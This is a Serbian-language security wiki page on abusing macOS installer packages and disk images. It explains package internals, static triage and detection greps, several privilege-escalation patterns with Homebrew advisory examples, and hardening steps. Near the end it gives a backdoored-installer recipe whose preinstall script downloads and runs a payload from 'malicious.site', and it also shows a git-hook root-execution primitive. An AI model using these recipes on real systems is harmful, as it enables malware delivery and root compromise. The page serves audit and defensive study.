# Zloupotreba macOS Installers

{{#include ../../../banners/hacktricks-training.md}}

## Osnovne informacije o Pkg

macOS **installer package** (poznat i kao `.pkg` fajl) je format fajla koji macOS koristi za **distribuciju softvera**. Ovi fajlovi su poput **kutije koja sadrži sve što je nekom softveru** potrebno da se pravilno instalira i pokrene.

Sam package fajl je arhiva koja sadrži **hijerarhiju fajlova i direktorijuma koji će biti instalirani na ciljnom** računaru. Može sadržati i **scripts** za izvršavanje zadataka pre i nakon instalacije, poput podešavanja konfiguracionih fajlova ili uklanjanja starih verzija softvera.

### Struktura package-a

<figure><img src="../../../images/Pasted Graphic.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption></figcaption></figure>

- **Distribution (xml)**: Prilagođavanja (naslov, tekst dobrodošlice…) i provere scripts/instalacije
- **PackageInfo (xml)**: Informacije, zahtevi instalacije, lokacija instalacije, putanje do scripts za izvršavanje
- **Bill of materials (bom)**: Lista fajlova za instaliranje, ažuriranje ili uklanjanje, sa dozvolama za fajlove
- **Payload (CPIO archive gzip compressed)**: Fajlovi za instaliranje u `install-location` iz PackageInfo
- **Scripts (CPIO archive gzip compressed)**: Pre-install i post-install scripts i dodatni resources ekstrahovani u privremeni direktorijum radi izvršavanja.

### Decompress
```bash
# Tool to directly get the files inside a package
pkgutil --expand "/path/to/package.pkg" "/path/to/out/dir"

# Get the files in a more manual way
mkdir -p "/path/to/out/dir"
cd "/path/to/out/dir"
xar -xf "/path/to/package.pkg"

# Decompress also the CPIO gzip compressed ones
cat Scripts | gzip -dc | cpio -i
cpio -i < Scripts
```
Da biste pregledali sadržaj installer-a bez njegovog ručnog dekompresovanja, možete koristiti i besplatni alat [**Suspicious Package**](https://mothersruin.com/software/SuspiciousPackage/).

### Prečice za statičku trijažu

Ako je cilj analiza, pokušajte da **izbegnete prvo otvaranje package-a pomoću `Installer.app`**. Neki package-i mogu da izvrše code čim ih Installer otvori (na primer putem `system.run()` ili installer plug-inova), pa je offline ekstrakcija obično bezbednija početna tačka.
```bash
PKG="Suspicious.pkg"
OUT="/tmp/pkg-audit"

# Preserve Distribution, scripts, resources and nested component pkgs
pkgutil --expand-full "$PKG" "$OUT"

# Signature / policy checks
pkgutil --check-signature "$PKG"
spctl -a -vv -t install "$PKG"

# Quick hunting: scripts, BOM contents and interesting primitives
find "$OUT" -type f \( -name preinstall -o -name postinstall \) -print -exec head -n 1 {} \;
find "$OUT" -type f \( -name Bom -o -name '*.bom' \) -exec lsbom -pf {} \; 2>/dev/null
xmllint --format "$OUT/Distribution" 2>/dev/null | sed -n '1,200p'
rg -n 'system\.(run|runOnce)|<script>|launchctl|osascript|curl|chmod 4[0-7]{3}|sudo -u |\$USER|\$HOME|/tmp/|/var/tmp/' "$OUT"
```
## Osnovne informacije o DMG-u

DMG fajlovi, odnosno Apple Disk Images, predstavljaju format fajlova koji Apple-ov macOS koristi za slike diskova. DMG fajl je u suštini **mountable disk image** (sadrži sopstveni filesystem) koji sadrži sirove blokovske podatke, obično kompresovane, a ponekad i šifrovane. Kada otvorite DMG fajl, macOS ga **mountuje kao da je fizički disk**, što vam omogućava pristup njegovom sadržaju.

> [!CAUTION]
> Imajte na umu da **`.dmg`** installers podržavaju **veoma veliki broj formata**, pa su u prošlosti neki od njih, koji su sadržali vulnerabilities, zloupotrebljavani za dobijanje **kernel code execution**.

### Struktura slike diska

<figure><img src="../../../images/image (225).png" alt=""><figcaption></figcaption></figure>

Hijerarhija DMG fajla može se razlikovati u zavisnosti od sadržaja. Međutim, za application DMGs ona obično prati sledeću strukturu:

- Top Level: Ovo je root slike diska. Često sadrži aplikaciju i, po potrebi, link ka Applications folderu.
- Application (.app): Ovo je sama aplikacija. U macOS-u, aplikacija je obično paket koji sadrži veliki broj pojedinačnih fajlova i foldera koji zajedno čine aplikaciju.
- Applications Link: Ovo je prečica do Applications foldera u macOS-u. Njena svrha je da olakša instalaciju aplikacije. Možete prevući .app fajl na ovu prečicu da biste instalirali aplikaciju.

## Privesc via pkg abuse

### Izvršavanje iz javnih direktorijuma

Ako pre- ili post-installation script izvršava fajl kao što je **`/var/tmp/Installerutil`**, a attacker može da zameni taj fajl, može da izvrši privilege escalation kada ga installer pozove. Navedena predavanja i walkthrough prikazuju varijante ovog insecure external-script pattern-a.<sup>[[1]](#references)</sup><sup>[[3]](#references)</sup><sup>[[4]](#references)</sup>

<figure><img src="../../../images/Pasted Graphic 5.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption><p><a href="https://www.youtube.com/watch?v=kCXhIYtODBg">https://www.youtube.com/watch?v=kCXhIYtODBg</a></p></figcaption></figure>

### AuthorizationExecuteWithPrivileges

Ovo je [public function](https://developer.apple.com/documentation/security/1540038-authorizationexecutewithprivileg) koju pozivaju mnogi installers i updaters kako bi **izvršili nešto kao root**. Ova funkcija kao parametar prihvata **path** do **file-a** koji treba **izvršiti**; međutim, ako attacker može da **izmeni** ovaj fajl, moći će da **zloupotrebi** njegovo izvršavanje sa root privilegijama radi **privilege escalation-a**.
```bash
# Breakpoint in the function to check which file is loaded
(lldb) b AuthorizationExecuteWithPrivileges
# You could also check FS events to find this misconfig
```
Za više informacija pogledajte ovo predavanje: [https://www.youtube.com/watch?v=lTOItyjTTkw](https://www.youtube.com/watch?v=lTOItyjTTkw)<sup>[[8]](#references)</sup>

### Zloupotreba environment-a i shebang-a

Nedavne greške u PackageKit-u pokazale su da se installer skripte često izvršavaju kao **trusted root code**, dok se u njihovoj blizini i dalje zadržava kontekst pod kontrolom napadača. Prilikom auditovanja paketa dobavljača, obratite posebnu pažnju na:

- Shell interpretere kao što su `#!/bin/zsh` / `#!/bin/bash`
- Pozive poput `sudo -u $USER`, `launchctl asuser` ili bilo koju logiku koja veruje vrednostima `$USER`, `$HOME`, `PATH`, `TMPDIR` ili relativnim putanjama
- Non-shell interpretere koji mogu učitavati init fajlove ili biblioteke pod kontrolom korisnika
```bash
pkgutil --expand-full Target.pkg /tmp/target-pkg
find /tmp/target-pkg -type f \( -name preinstall -o -name postinstall \) -exec sh -c 'printf "\n### %s\n" "$1"; head -n 1 "$1"' sh {} \;
rg -n '^#!/bin/(zsh|bash)|sudo -u |launchctl asuser|\$USER|\$HOME|PATH=|/usr/bin/env ' /tmp/target-pkg
```
Za bug u PackageKit-u iz 2024. (`~/.zshenv` / `~/.bash*` nasleđivanje tokom instalacija koje pokreće korisnik), pogledajte [generic macOS privesc page](../macos-privilege-escalation.md). Ako je paket **Apple-signed**, isti bug u skripti može postati relevantan za **SIP/TCC**, jer `system_installd` može imati `com.apple.rootless.install.heritable`; pogledajte [SIP page](../macos-security-protections/macos-sip.md).<sup>[[5]](#references)</sup><sup>[[6]](#references)</sup>

### Stateful inputs and implicit callbacks

Ne ograničavajte proveru samo na očiglednu command injection. Root `preinstall`/`postinstall` može preći granicu poverenja kada koristi **stanje koje je postojalo pre instalacije**: predvidljive datoteke u `/tmp` ili `/var/tmp`, postojeće instalaciono stablo koje korisnik može da menja, konfiguracione datoteke, metapodatke repozitorijuma ili korisničko ime koje se kasnije prosleđuje komandi `chown`.<sup>[[9]](#references)[[10]](#references)</sup>

Dva nedavna propusta u Homebrew installer-u prikazuju varijante koje se mogu ponovo koristiti:

- **Ownership koji bira napadač:** override za korisnika paketa učitavan je iz predvidljive datoteke `/var/tmp/.homebrew_pkg_user.plist`, bez provere njenog vlasnika, moda, ACL-ova, stanja symlink-a ili porekla. Korisnik sa niskim privilegijama mogao je da izabere sopstveni nalog, nakon čega bi kasniji root `postinstall` rekurzivno preneo ownership Homebrew stabla i keša na taj nalog. Ovo je bio propust u dodeli privilegija, a ne shell injection.<sup>[[9]](#references)</sup>
- **Tool callbacks iz postojećeg stabla:** root `postinstall` je pokretao `git checkout` unutar instalacije koju je njen uobičajeni korisnik namerno mogao da menja. Postavljanje izvršne datoteke `.git/hooks/post-checkout` zato je kasniju GUI/MDM nadogradnju paketa pretvaralo u izvršavanje koda sa root privilegijama. Na Intel putanji, spajanje zapakovanog `.git` direktorijuma sa postojećim repozitorijumom takođe je očuvalo hook-ove koje je dodao napadač.<sup>[[10]](#references)</sup>

Drugi primitiv lako je modelovati tokom ovlašćenog testa; okidač se javlja tek kada ranjivi privilegovani installer kasnije pokrene Git operaciju koja podržava hook-ove.<sup>[[10]](#references)</sup>
```bash
repo=/path/to/user-writable/install
mkdir -p "$repo/.git/hooks"
cat > "$repo/.git/hooks/post-checkout" <<'EOF'
#!/bin/sh
id > /tmp/pkg-post-checkout-context
EOF
chmod +x "$repo/.git/hooks/post-checkout"
# Wait for the privileged .pkg install/upgrade; do not invoke it as root just to test.
```
Proširite ugnježdene pakete i mapirajte svaki izvor pod kontrolom napadača do privilegovanog odredišta. Pored direktnog izvršavanja, pretražite parser-e, promene vlasništva i alate sa mehanizmima za plug-in/hook.<sup>[[9]](#references)[[10]](#references)</sup>
```bash
PKG=Target.pkg
OUT=$(mktemp -d)
pkgutil --expand-full "$PKG" "$OUT"
grep -RniE '(/var/tmp|/tmp|defaults[[:space:]]+read|PlistBuddy|chown[[:space:]]+-R)' "$OUT"
grep -RniE '(^|[;&|[:space:]])(git|svn|hg|npm|pip|ruby|python)[[:space:]]' "$OUT"
grep -RniE '(checkout|reset|submodule|hooksPath|GIT_(DIR|CONFIG)|PYTHONPATH|RUBYOPT)' "$OUT"
```
Radi hardeninga, premestite privilegovane ulaze u staging direktorijum u vlasništvu root korisnika i proverite svaku putanju neposredno pre upotrebe (regularna datoteka, očekivani vlasnik/režim, bez nebezbednog ACL-a i bez symlink traversal-a). Izbegavajte rekurzivnu promenu vlasništva iz nepouzdanog identiteta. Kada Git mora da se pokrene nad unapred postojećim stablom, eksplicitno onemogućite callback-ove (na primer, `git -c core.hooksPath=/dev/null ...`) ili atomski zamenite metapodatke repozitorijuma pre pokretanja Git-a.<sup>[[9]](#references)[[10]](#references)</sup>

### Izvršavanje montiranjem

Ako installer upisuje u `/tmp/fixedname/bla/bla`, moguće je **napraviti mount** preko `/tmp/fixedname` sa opcijom noowners, čime možete **izmeniti bilo koju datoteku tokom instalacije** i zloupotrebiti proces instalacije.

Primer za ovo je **CVE-2021-26089**, kojim je uspelo **prepisivanje periodičnog skripta** radi dobijanja izvršavanja kao root. Za više informacija pogledajte predavanje: [**OBTS v4.0: "Mount(ain) of Bugs" - Csaba Fitzl**](https://www.youtube.com/watch?v=jSYPazD4VcE)<sup>[[7]](#references)</sup>

## pkg kao malware

### Prazan Payload

Moguće je jednostavno generisati **`.pkg`** datoteku sa **pre i post-install skriptama**, bez stvarnog Payload-a osim malware-a unutar tih skripti.<sup>[[2]](#references)</sup>

### JS u Distribution xml-u

Moguće je dodati **`<script>`** tagove u **distribution xml** datoteku paketa; taj kod će se izvršiti i može **izvršavati komande** koristeći **`system.run`**:

<figure><img src="../../../images/image (1043).png" alt=""><figcaption></figcaption></figure>

Kod distribution paketa ovo obično zavisi od toga da li najviši nivo `Distribution` datoteke omogućava eksterne skripte, na primer pomoću `allow-external-scripts="true"`. Zato pregled samo `preinstall` / `postinstall` skripti nije dovoljan: sam **Distribution XML** može sadržati `installation-check` / `volume-check` hook-ove i direktne putanje izvršavanja funkcija `system.run()` / `system.runOnce()`.
```bash
xmllint --format Distribution | sed -n '1,200p'
rg -n 'allow-external-scripts|system\.(run|runOnce)|installation-check|volume-check|function ' Distribution
```
### Installer sa backdoorom

Zlonamerni installer koji koristi skriptu i JS kod unutar dist.xml
```bash
# Package structure
mkdir -p pkgroot/root/Applications/MyApp
mkdir -p pkgroot/scripts

# Create preinstall scripts
cat > pkgroot/scripts/preinstall <<EOF
#!/bin/bash
echo "Running preinstall script"
curl -o /tmp/payload.sh http://malicious.site/payload.sh
chmod +x /tmp/payload.sh
/tmp/payload.sh
exit 0
EOF

# Build package
pkgbuild --root pkgroot/root --scripts pkgroot/scripts --identifier com.malicious.myapp --version 1.0 myapp.pkg

# Generate the malicious dist.xml
cat > ./dist.xml <<EOF
<?xml version="1.0" encoding="utf-8"?>
<installer-gui-script minSpecVersion="1">
<title>Malicious Installer</title>
<options allow-external-scripts="true" customize="allow" require-scripts="true"/>
<script>
<![CDATA[
function installationCheck() {
if (system.isSandboxed()) {
my.result.title = "Cannot install in a sandbox.";
my.result.message = "Please run this installer outside of a sandbox.";
return false;
}
return true;
}
function volumeCheck() {
return true;
}
function preflight() {
system.run("/path/to/preinstall");
}
function postflight() {
system.run("/path/to/postinstall");
}
]]>
</script>
<choices-outline>
<line choice="default">
<line choice="myapp"/>
</line>
</choices-outline>
<choice id="myapp" title="MyApp">
<pkg-ref id="com.malicious.myapp"/>
</choice>
<pkg-ref id="com.malicious.myapp" installKBytes="0" auth="root">#myapp.pkg</pkg-ref>
</installer-gui-script>
EOF

# Build final
productbuild --distribution dist.xml --package-path myapp.pkg final-installer.pkg
```
## References

- [1] [DEF CON 27 - Raspakivanje Pkgs: Pogled unutar macOS instalacionih paketa i uobičajenih bezbednosnih propusta](https://www.youtube.com/watch?v=iASSG0_zobQ)
- [2] [OBTS v4.0: "Divlji svet macOS instalacionih programa" - Tony Lambert](https://www.youtube.com/watch?v=Eow5uNHtmIg)
- [3] [DEF CON 27 - Raspakivanje Pkgs: Pogled unutar macOS instalacionih paketa](https://www.youtube.com/watch?v=kCXhIYtODBg)
- [4] [RedTeamRecipe – macOS Red Teaming: Iskorišćavanje instalacionih paketa](https://redteamrecipe.com/macos-red-teaming?utm_source=pocket_shared#heading-exploiting-installer-packages)
- [5] [CVE-2024-27822: Eskalacija privilegija u macOS PackageKit-u](https://khronokernel.com/macos/2024/06/03/CVE-2024-27822.html)
- [6] [Razbijanje SIP-a pomoću paketa potpisanih od strane Apple-a](https://www.l3harris.com/newsroom/editorial/2024/03/breaking-sip-apple-signed-packages)
- [7] [OBTS v4.0: "Mount(ain) of Bugs" - Csaba Fitzl](https://www.youtube.com/watch?v=jSYPazD4VcE)
- [8] [DEF CON 25 - Patrick Wardle - Smrt od 1000 instalacionih programa na macOS-u i sve je pokvareno!](https://www.youtube.com/watch?v=lTOItyjTTkw)
- [9] [macOS instalacioni program Homebrew veruje plist-u package-user kojim upravlja korisnik](https://github.com/Homebrew/brew/security/advisories/GHSA-59v8-x8q4-px5c)
- [10] [Izvršavanje koda sa root privilegijama putem Git hooks-a u macOS PKG postinstall-u](https://github.com/Homebrew/brew/security/advisories/GHSA-6689-q779-c33m)
{{#include ../../../banners/hacktricks-training.md}}
